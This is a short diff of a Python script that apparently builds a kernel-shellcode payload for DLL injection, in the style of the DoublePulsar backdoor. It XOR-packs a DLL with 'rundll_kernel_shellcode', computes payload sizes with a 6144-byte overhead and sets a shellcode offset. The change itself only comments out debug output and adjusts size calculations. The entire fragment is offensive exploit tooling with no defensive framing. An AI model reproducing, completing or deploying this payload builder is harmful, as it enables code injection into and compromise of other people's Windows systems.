@@ -380,17 +380,21 @@ if __name__ == "__main__":
         b_bytes_xor_key = bytes(bytes_xor_key.encode())
 
         hex_bytes = read_dll_file_as_hex()
-        total_size_little_endian = struct.pack('<I', len(hex_bytes))
-        print(hexdump(total_size_little_endian))
+        #Commented out for debug purposes
+        #total_size_little_endian = struct.pack('<I', len(hex_bytes))
+        #print(hexdump(total_size_little_endian))
         print('File size: {:d}'.format(len(hex_bytes)))
 
         bytearray_rundll_kernel_shellcode = bytearray(rundll_kernel_shellcode)
         bytearray_hex_bytes = bytearray(hex_bytes)
 
-        EntireDLLSize = len(hex_bytes)
-
-        EntirePayloadSize = len(hex_bytes) + 6144
-        #debug purposes:  EntirePayloadSize = 0x50D800FF
+        #EntireDLLSize = len(hex_bytes)
+        EntireDLLSize = len(bytearray_hex_bytes)
+        #EntirePayloadSize = len(hex_bytes) + 6144
+        EntirePayloadSize = len(bytearray_hex_bytes) + 6144
+        
+        #for debug purposes
+        #EntirePayloadSize = 0x50D800FF
         #EntirePayloadSize = 6144 + len(hex_bytes)
 
         offset_kernel_shellcode = 2158
